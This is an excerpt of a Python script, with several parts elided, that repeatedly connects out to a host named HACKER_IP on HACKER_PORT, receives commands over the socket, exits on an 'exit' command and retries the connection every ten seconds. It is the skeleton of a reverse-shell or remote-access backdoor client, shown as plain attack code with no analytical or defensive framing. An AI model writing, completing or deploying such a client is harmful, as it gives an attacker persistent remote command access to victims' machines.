...
def main():
    ...
    print("[INFO] Script started. Attempting to connect...")

    while True:
        try:
            with socket.socket() as s:
                s.connect((HACKER_IP, HACKER_PORT))
                print(f"[INFO] Connected to {HACKER_IP}:{HACKER_PORT}")
                ...
                while True:
                    ...
                    print(f"[INFO] Received command: {cmd}")

                    if cmd == "exit":
                        print("[INFO] Received exit command. Closing connection.")
                        break
            ...
            print(f"[ERROR] Connection error: {str(e)}. Retrying in 10 seconds...")
            time.sleep(10)
            continue
